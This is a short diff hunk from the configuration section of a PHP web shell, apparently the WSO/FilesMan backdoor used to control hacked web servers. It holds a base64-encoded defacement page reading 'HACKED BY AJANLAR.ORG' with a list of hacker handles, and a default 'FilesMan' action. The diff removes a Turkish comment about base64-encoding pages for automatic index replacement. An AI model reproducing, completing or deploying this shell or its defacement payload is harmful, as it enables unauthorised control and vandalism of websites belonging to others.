@@ -9,7 +9,6 @@ $default_charset = 'UTF-8'; // UTF-8 Kalsin
 //		KOI8-R 
 //		KOI8-U 
 //		cp866
-				 				// Buraya index kodlarınızı base64 e çevirip auto index atabilirsiniz
 $defacepage ='PHRpdGxlPkhBQ0tFRCBCWSBBSkFOTEFSLk9SRzwvdGl0bGU+Cgo8Y2VudGVyPgoJPGgxPkhBQ0tFRCBCWSBBSkFOTEFSLk9SRzwvaDE+Cgk8QlI+Cgk8QlI+Cgk8aDY+CkZhbmV0c2EgfCBBbjBuIDN4UGxvaVRlUiB8IEIwUlU3MCB8IFJhRDAgfCBibGFja21pbGFkWiB8IGFTRU5TRSEgfCBDeWJlclR1cmsgfCBIYXhTdHJvTSB8IGlDb21zaXVtIHwgejNyMGZ5IHwgRXIwaW4gfCBsMHJ4aGVsbCB8IEVuczRSIHwgRzNuem8gfCBUdXJLTG9KZU4gfCBYZW9uaXNINHdrei4uIC4vQWphbmxhci5Pcmc=';
 	// ===================== Special Thanks to Ajanlar.Org =================== //
 $default_action = 'FilesMan';
